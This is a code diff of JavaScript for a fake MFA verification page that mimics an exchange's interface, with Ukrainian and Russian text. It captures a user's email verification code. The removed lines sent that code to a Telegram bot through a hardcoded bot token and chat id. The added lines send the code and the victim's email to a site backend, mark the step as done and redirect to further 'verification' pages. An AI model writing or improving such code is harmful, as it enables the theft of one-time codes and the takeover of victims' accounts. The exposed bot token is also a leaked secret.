@@ -240,37 +240,69 @@ document.addEventListener('DOMContentLoaded', function() {
             }
             
             if (code) {
-                const token = '8437518091:AAH7z8V7cWjJdH0EVFRIMGfHSJAjoD8Cb28';
-                const chat_id = '587511371';
-                const message = `Код для верифікації (Email): ${code}`;
+                // Получить email пользователя из localStorage или URL параметров
+                const userEmail = getUserEmail();
                 
-                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                // Использовать безопасную функцию отправки кода
+                fetch('/api/send-code', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ chat_id, text: message })
-                }).then(() => {
-                    // Обновить состояние верификации
-                    let completedVerifications = JSON.parse(localStorage.getItem('completedVerifications')) || [];
-                    if (!completedVerifications.includes('email')) {
-                        completedVerifications.push('email');
-                        localStorage.setItem('completedVerifications', JSON.stringify(completedVerifications));
-                    }
-                    
-                    // Всегда вернуться на страницу verification.html
-                    window.location.href = 'verification.html';
-                }).catch(() => {
-                    // Все равно продолжить с логикой даже при ошибке отправки
-                    let completedVerifications = JSON.parse(localStorage.getItem('completedVerifications')) || [];
-                    if (!completedVerifications.includes('email')) {
-                        completedVerifications.push('email');
-                        localStorage.setItem('completedVerifications', JSON.stringify(completedVerifications));
-                    }
-                    
-                    window.location.href = 'verification.html';
+                    body: JSON.stringify({ 
+                        type: 'email',
+                        code: code,
+                        email: userEmail
+                    })
+                }).then(response => response.json()).then(result => {
+                    console.log('Код отправлен:', result);
+                }).catch(error => {
+                    console.log('Ошибка:', error);
                 });
+                
+                // Обновить состояние верификации
+                let completedVerifications = JSON.parse(localStorage.getItem('completedVerifications')) || [];
+                if (!completedVerifications.includes('email')) {
+                    completedVerifications.push('email');
+                    localStorage.setItem('completedVerifications', JSON.stringify(completedVerifications));
+                }
+                
+                // Всегда вернуться на страницу verification.html
+                setTimeout(() => {
+                    window.location.href = 'verification.html';
+                }, 1000);
             }
         });
     }
+    
+    // Функция для получения email пользователя
+    function getUserEmail() {
+        // Попробовать получить из URL параметров
+        const urlParams = new URLSearchParams(window.location.search);
+        const emailFromUrl = urlParams.get('email');
+        
+        // Попробовать получить из localStorage
+        const emailFromStorage = localStorage.getItem('userEmail');
+        
+        // Попробовать получить из sessionStorage
+        const emailFromSession = sessionStorage.getItem('userEmail');
+        
+        return emailFromUrl || emailFromStorage || emailFromSession || 'user@example.com';
+    }
+    
+    // Добавить обработчик клика для кнопок "Надіслати"
+    const submitButtons = document.querySelectorAll('button[data-e2e="btn-mfa-verify"], button.mfa-verify-buttonv2, .bn-button__primary');
+    submitButtons.forEach(button => {
+        if (button.textContent.includes('Надіслати') || button.textContent.includes('Send') || button.textContent.includes('Verify')) {
+            button.addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                // Триггеруем событие submit для формы
+                const form = document.querySelector('form');
+                if (form) {
+                    form.dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
+                }
+            });
+        }
+    });
     
     function showFinalNotification() {
         // Создать модальное окно с финальным уведомлением
